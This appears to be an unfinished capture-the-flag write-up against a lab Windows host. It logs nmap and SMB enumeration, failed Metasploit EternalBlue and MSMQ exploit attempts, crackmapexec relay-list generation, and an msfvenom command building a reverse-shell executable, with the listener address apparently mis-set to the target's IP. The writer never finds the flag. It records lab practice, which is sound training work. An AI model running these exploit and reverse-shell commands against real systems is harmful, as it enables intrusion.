Target: Machine 0139009D
Target IP: 10.129.163.238
Status: Incomplete

Step 1: Network Recon

port scan was done to find running services

nmap 10.129.163.238

3 windows management and file sharing ports were discovered to be open:
  135/tcp: MSRPC
  139/tcp: NetBIOS Session Service (netbios-ssn)
  445/tcp: SMB (microsoft-ds)

Step 2: SMB Access

I checked SMB service to test for access

smbclient -L //10.129.163.238 -N
It resulted in: NT_STATUS_ACCESS_DENIED

I tried again but with user administrator and anonymous login

smbclient -L //10.129.163.238 -U anonymous
Resulted in NT_STATUS_LOGON_FAILURE

Step 3: Exploitation Attempt with Metasploit

Checked for vulnerability against SMBv1 EternalBlue

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.163.238
set LHOST 10.10.14.27
exploit

It said that the target is not vulnerable.

<img width="468" height="279" alt="image" src="https://github.com/user-attachments/assets/2053dcce-9fa5-4724-8789-ff0287bca2b1" />


I did a web service check by heading to [http://10.129.163.238/] but the request timed out.

Attempted exploit/windows/dcerpc/ms05_017_msmq against port 2103/RPC but failed.

Step 4: SMB Protocol Enumeration 

ran this command:
nmap --script smb-protocols -p 445 10.129.163.238

This confirmed SMBv1 is disabled 

enum4linux-ng 10.129.163.238

Resulted in fingerprint the OS as Windows 10 / Windows Server 2019 / Server 2016

Step 5: Payload Setup

I generated reverse shell with msfvenom

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.129.163.238 LPORT=4444 -f exe > shell.exe

Did a SMB config check

crackmapexec smb 10.129.163.238 --gen-relay-list relay.txt

<img width="468" height="285" alt="image" src="https://github.com/user-attachments/assets/1cd24ced-d506-4dfa-90fd-908c86a1ef7c" />


Overall I was unable to find the flag for this CTF
